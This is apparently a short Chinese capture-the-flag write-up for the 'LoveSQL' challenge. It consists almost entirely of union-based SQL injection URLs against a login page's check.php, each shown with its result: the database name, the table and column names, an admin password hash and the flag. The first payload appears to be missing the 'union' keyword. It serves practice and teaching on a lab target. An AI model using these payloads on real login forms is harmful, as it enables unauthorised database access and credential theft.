# [极客大挑战 2019]LoveSQL

打开是一个登录的窗口，根据题目意思是要进行SQL注入

## 查询数据库
`/check.php?username=aaa'select+1,2,database()%23&password=bbb`
geek

## 查询表
`/check.php?username=aaa'+union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema='geek'%23&password=bbb`
geekuser,l0ve1ysq1

## 查询字段
`/check.php?username=aaa'+union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_name='geekuser'%23&password=bbb`
id,username,password

`/check.php?username=aaa'+union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_name='l0ve1ysq1'%23&password=bbb`
id,username,password

## 查询数据
`/check.php?username=aaa'+union+select+1,2,group_concat(id,username,password)+from+geekuser%23&password=bbb`
1 admin e9021ff98565d8fe1a566ee12a121ba2

`/check.php?username=aaa'+union+select+1,2,group_concat(id,username,password)+from+l0ve1ysq1%23&password=bbb`
flag{66e7f374-ba3f-43be-9cea-b11bb4a994d3}
